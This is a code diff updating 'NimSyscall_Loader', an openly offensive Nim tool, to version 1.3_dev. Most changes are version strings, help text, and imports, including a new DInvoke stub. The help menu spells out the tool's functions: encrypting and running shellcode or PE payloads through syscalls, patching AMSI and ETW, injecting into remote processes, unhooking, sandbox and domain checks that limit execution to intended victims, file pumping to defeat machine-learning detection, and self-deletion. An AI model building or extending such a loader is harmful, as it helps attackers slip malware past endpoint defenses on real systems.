@@ -43,7 +43,8 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.2                                             
+                                                                 v1.3_dev                                            
+
 """
 
 echo banner
@@ -51,7 +52,7 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.2
+NimSyscall_Loader v 1.3_dev
 
 Usage:
   NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size>]
@@ -84,11 +85,11 @@ Options:
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --replace    Replace common nim IoC's in the loader like the string 'nim'
-  --sandbox Check1    Include Sandbox Checks of your choice into the loader:
-                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
-                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
-                      DiskSpace -> Only execute if c:\ disk space >= 200GB
-                      MemorySpace -> Only execute if more than 4GB RAM available
+  --sandbox value    Include Sandbox Checks of your choice into the loader:
+                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
+                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
+                     DiskSpace -> Only execute if c:\ disk space >= 200GB
+                     MemorySpace -> Only execute if more than 4GB RAM available
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                   size -> just pump the size to avoid signatures for smaller files
@@ -139,7 +140,7 @@ var
     pumpfmt: string = ""
     pumpargs: seq[string]
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.2")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.3_dev")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -302,7 +303,7 @@ import osproc
 
 
 let AssemblyImports = """
-import winim/clr except `[]`
+from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
 let LoadAssemblyStub = """
@@ -360,7 +361,7 @@ let Cryptstub1 = """
 import winim/lean
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
-#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
+#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
 import dynlib
 import strformat
 from os import paramCount, paramStr
@@ -369,6 +370,7 @@ import base64
 import strutils
 import ptr_math
 import strenc
+import DInvoke
 
 var success: BOOL
 
@@ -700,6 +702,8 @@ if (hellsgate):
             stub.add(LoadAssemblyStub)
             stub.add(LoadAssemblyStubArgs)
         csharp = false
+else:
+    stub.add(DInvokeBaseStub)
 if (peload):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
